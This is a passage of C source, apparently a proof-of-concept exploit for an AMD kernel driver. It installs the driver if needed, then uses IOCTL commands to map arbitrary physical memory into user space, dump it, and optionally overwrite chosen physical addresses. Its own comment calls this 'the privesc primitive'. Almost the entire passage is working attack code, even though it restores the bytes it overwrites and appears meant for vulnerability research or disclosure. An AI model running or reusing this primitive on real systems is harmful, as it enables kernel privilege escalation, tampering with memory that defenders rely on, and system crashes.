                LogW(L"[i] service %ls present (state=%lu)\n", AUDIT_SVC, ss.dwCurrentState);
            CloseServiceHandle(svc);
        }
        CloseServiceHandle(scm);
    }

    cr = CM_Locate_DevNodeW(&dn, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_NORMAL);
    if (cr != CR_SUCCESS) {
        if (CM_Locate_DevNodeW(&dn, (DEVINSTID_W)AUDIT_NODE, CM_LOCATE_DEVNODE_PHANTOM) == CR_SUCCESS)
            LogW(L"[!] devnode %ls is PHANTOM: registry keys exist but PnP never\n"
                 L"    reported it present -- v1.1 raw-registry install signature;\n"
                 L"    the driver was never loaded\n", AUDIT_NODE);
        else
            LogW(L"[!] devnode %ls does not exist -- install was never run\n", AUDIT_NODE);
        return;
    }

    if (CM_Get_DevNode_Status(&st, &pr, dn, 0) != CR_SUCCESS) {
        LogW(L"[!] CM_Get_DevNode_Status failed on %ls\n", AUDIT_NODE);
        return;
    }
    LogW(L"[i] devnode %ls: status=0x%08lX problem=%lu%s%s\n", AUDIT_NODE,
         (unsigned long)st, (unsigned long)pr,
         (st & DN_STARTED) ? L" STARTED" : L" NOT_STARTED",
         (st & DN_HAS_PROBLEM) ? L" HAS_PROBLEM" : L"");
    for (i = 0; i < sizeof(g_problemCodes) / sizeof(g_problemCodes[0]); i++)
        if (g_problemCodes[i].c == pr) {
            LogW(L"[i] meaning: %ls\n", g_problemCodes[i].n);
            break;
        }
    if (!(st & DN_STARTED) || (st & DN_HAS_PROBLEM)) {
        LogW(L"[i] if the problem is load-time code integrity, confirm with:\n"
             L"      wevtutil qe Microsoft-Windows-CodeIntegrity /c:20 /rd:true /f:text\n"
             L"    (HVCI enables the Microsoft vulnerable-driver blocklist; a listed\n"
             L"    driver is denied at image load even though it is properly signed)\n");
    }
}

/* map `pa` for `bytes` via command 0xFFF028A4; reply fields come from the
 * 0x21-byte copy-back into `reply` (status@+0x0C block@+0x10 userVa@+0x18) */
static BOOL DevCmdMap(UINT64 pa, UINT32 bytes, UINT8 cache, DEVREQ *reply)
{
    DEVREQ out;
    DWORD br = 0;

    ZeroMemory(&out, sizeof(out));
    reply->mapPa   = pa;
    reply->mapLen  = bytes;
    reply->cache   = cache;
    reply->status  = 0;
    reply->block   = 0;
    reply->userVa  = 0;
    if (!DeviceIoControl(g_dev, CMD_MAP, (LPVOID)reply, TRANS_IN_LEN,
                         (LPVOID)&out, TRANS_OUT_LEN, &br, NULL))
        return FALSE;
    *reply = out;
    return TRUE;
}

/* companion 0xFFF028A8: unmap user mapping, free MDL + 'ADIO' pool block */
static BOOL DevCmdUnmap(UINT64 block)
{
    DEVREQ req, out;
    DWORD br = 0;

    ZeroMemory(&req, sizeof(req));
    ZeroMemory(&out, sizeof(out));
    req.block = block;      /* the handle map returned at req+0x10 */
    return DeviceIoControl(g_dev, CMD_UNMAP, (LPVOID)&req, TRANS_IN_LEN,
                           (LPVOID)&out, TRANS_OUT_LEN, &br, NULL);
}

/* classic 16-byte rows: hex + ASCII gutter, one fully-assembled line per row */
static void Dump(UINT64 va, UINT32 bytes)
{
    const UINT8 *p = (const UINT8 *)(uintptr_t)va;
    UINT32 o;

    for (o = 0; o < bytes; o += 16) {
        char line[128], ascii[20];
        UINT32 i, n = (bytes - o < 16) ? (bytes - o) : 16;
        size_t off = 0;
        int k;

        ascii[16] = 0;
        k = snprintf(line, sizeof(line), "    %04x  ", o);
        if (k > 0) off = (size_t)k;
        for (i = 0; i < 16; i++) {
            UINT8 b   = (i < n) ? p[o + i] : 0;
            int shown = (i < n);

            if (i == 8) {                      /* mid-row gap */
                k = snprintf(line + off, sizeof(line) - off, " ");
                if (k > 0) off += (size_t)k;
            }
            if (shown) {
                k = snprintf(line + off, sizeof(line) - off, "%02x ", b);
                ascii[i] = (b >= 0x20 && b < 0x7f) ? (char)b : '.';
            } else {
                k = snprintf(line + off, sizeof(line) - off, "   ");
                ascii[i] = ' ';
            }
            if (k > 0) off += (size_t)k;
        }
        LogA("%s|%s|", line, ascii);
    }
}

/* DEVREQ.cache values (MmMapIoSpace CACHE_TYPE) */
static const wchar_t *CacheText(UINT8 cache)
{
    switch (cache) {
    case 0:  return L"noncached";
    case 1:  return L"MmCached";
    case 2:  return L"write-combined";
    default: return L"unknown";
    }
}

/* driver-written DEVREQ.status codes (sub_140002090 / sub_140002CB8) */
static const wchar_t *DevStatusText(UINT32 st)
{
    switch (st) {
    case 0:  return L"SUCCESS";
    case 5:  return L"insufficient resources";
    case 6:  return L"invalid length parameter";
    default: return L"unexpected code";
    }
}

static UINT64 ReadU64(const UINT64 *p) { return *p; }
static UINT64 ParseU64(const wchar_t *s) { return _wcstoui64(s, NULL, 0); }

int wmain(int argc, wchar_t **argv)
{
    UINT64 mapPa = 0x1000, writePa = 0, writeValue = 0;
    UINT32 mapLen = 0x1000;
    UINT8  cache = 1;            /* MmCached */
    BOOL   doWrite = FALSE, keepMapped = FALSE, doInstall = FALSE;
    unsigned long long t0, t1;
    UINT32 DumpLen;              /* bytes shown in the dump: min(mapLen, 64) */

    OpenTeelog();                /* tee all output to amd_map_poc.log beside the exe */

    for (int i = 1; i < argc; i++) {
        if (!wcscmp(argv[i], L"--pa") && i + 1 < argc)            mapPa = ParseU64(argv[++i]);
        else if (!wcscmp(argv[i], L"--len") && i + 1 < argc)      mapLen = (UINT32)wcstoul(argv[++i], NULL, 0);
        else if (!wcscmp(argv[i], L"--cache") && i + 1 < argc)    cache = (UINT8)wcstoul(argv[++i], NULL, 0);
        else if (!wcscmp(argv[i], L"--write-pa") && i + 1 < argc) { writePa = ParseU64(argv[++i]); doWrite = TRUE; }
        else if (!wcscmp(argv[i], L"--value") && i + 1 < argc)    writeValue = ParseU64(argv[++i]);
        else if (!wcscmp(argv[i], L"--no-unmap"))                 keepMapped = TRUE;
        else if (!wcscmp(argv[i], L"--install"))                  doInstall = TRUE;
        else { LogW(L"unknown arg %ls\n", argv[i]); return 2; }
    }
    DumpLen = (mapLen < 64) ? mapLen : 64;

    SetConsoleTitleW(TOOL_CON_TITLE);
    PrintBanner();
    t0 = GetTickCount64();
    LogW(L"[i] transport: command = dwIoControlCode (e.g. 0xFFF028A4), standard "
             L"METHOD_BUFFERED in/out -- no address window needed");

    /* 1. open the device (ACL: SYSTEM + Administrators only) */
    Section(L"device interface");
    if (!OpenDeviceByInterface(&g_dev)) {
        if (!doInstall) {
            LogW(L"[x] no live AmdTools64 device interface: the audit devnode is\n"
                 L"    missing, phantom, or not started. Re-run with --install (or\n"
                 L"    load_amd_servicemode.cmd) to create it through the CM APIs.");
            DiagnoseAuditDevnode();
            return 1;
        }
        LogW(L"[*] --install: kernel service + root devnode through the CM APIs");
        if (!InstallAndStart()) {
            DiagnoseAuditDevnode();
            return 1;
        }
        if (!OpenDeviceWait(&g_dev, 15000)) {
            LogW(L"[x] device interface did not come up after install");
            DiagnoseAuditDevnode();
            return 1;
        }
    }

    /* 2. map an arbitrary physical address */
    Section(L"map physical address -> user VA");
    DEVREQ req;
    if (!DevCmdMap(mapPa, mapLen, cache, &req)) {
        LogW(L"[x] map DeviceIoControl failed GLE=%lu", GetLastError());
        CloseHandle(g_dev);
        return 1;
    }

    LogW(L"    map ........ PA 0x%012llx, %u bytes, cache %u (%ls)",
         (unsigned long long)mapPa, mapLen, cache, CacheText(cache));
    LogW(L"    status ..... 0x%08x -- %ls", req.status, DevStatusText(req.status));
    LogW(L"    pool block . 0x%016llx", (unsigned long long)req.block);
    LogW(L"    user va .... 0x%016llx", (unsigned long long)req.userVa);

    UINT64 respBlock = req.block;
    UINT64 mappedVa  = req.userVa;
    if (mappedVa == 0 || mappedVa >= 0x800000000000ULL) {
        LogW(L"[x] driver failed to map (status field 0x%x) or VA not user-mode",
             req.status);
        CloseHandle(g_dev);
        return 1;
    }

    /* 3. read real physical memory from user mode (the privesc primitive) */
    Section(L"read from the mapping");
    LogW(L"[+] %u physical bytes read directly from user space:", DumpLen);
    Dump(mappedVa, DumpLen);

    /* 5. optional write demonstration (restores the original 8 bytes) */
    if (doWrite) {
        Section(L"write demonstration");
        LogW(L"[!] WRITE MODE: touching physical 0x%llx -- crash risk",
             (unsigned long long)writePa);
        DEVREQ wreq;
        if (!DevCmdMap(writePa, 0x1000, cache, &wreq)) {
            LogW(L"[x] write map failed GLE=%lu", GetLastError());
        } else if (wreq.status == 0 && wreq.userVa) {
            UINT64 *p = (UINT64 *)(uintptr_t)wreq.userVa;
            UINT64 before = ReadU64(p);
            *p = writeValue;
            LogW(L"    original .. 0x%016llx", (unsigned long long)before);
            LogW(L"    wrote ..... 0x%016llx", (unsigned long long)writeValue);
            LogW(L"    readback .. 0x%016llx", (unsigned long long)ReadU64(p));
            if (ReadU64(p) == writeValue)
                LogW(L"[+] CONFIRMED: user-mode write through the physical mapping");
            *p = before;   /* restore -- do not leave the OS with edited memory */
            LogW(L"[+] original value restored");
            if (!DevCmdUnmap(wreq.block))
                LogW(L"[!] failed to unmap write mapping 0x%llx",
                     (unsigned long long)wreq.userVa);
        } else {
            LogW(L"[x] write map rejected (status field 0x%x)", wreq.status);
        }
    }

    /* 4. cleanup via the unmap companion */
    Section(L"cleanup");
    if (keepMapped)
        LogW(L"[*] --no-unmap: user VA 0x%016llx held open ('ADIO' block 0x%016llx leaked)",
             (unsigned long long)mappedVa, (unsigned long long)respBlock);
    else if (DevCmdUnmap(respBlock))
        LogW(L"[+] mapping released via 0xFFF028A8 ('ADIO' block 0x%016llx)",
             (unsigned long long)respBlock);
    else
        LogW(L"[!] unmap call failed GLE=%lu", GetLastError());

    CloseHandle(g_dev);

    /* run summary */
    t1 = GetTickCount64();
    LogW(L"");
    LogW(L"  +==========================================================+");
    LogW(L"    RESULT: primitive exercised end-to-end");
    LogW(L"      read ...... PA 0x%012llx -> user VA 0x%016llx (%u bytes)",
         (unsigned long long)mapPa, (unsigned long long)mappedVa, DumpLen);
    LogW(L"      unmap ..... %ls",
         keepMapped ? L"mapping left open (--no-unmap)"
                    : L"'ADIO' block released via 0xFFF028A8");
    LogW(L"      run time .. %llu.%03llu s", (t1 - t0) / 1000ULL, (t1 - t0) % 1000ULL);
    LogW(L"  +==========================================================+");
    return 0;
}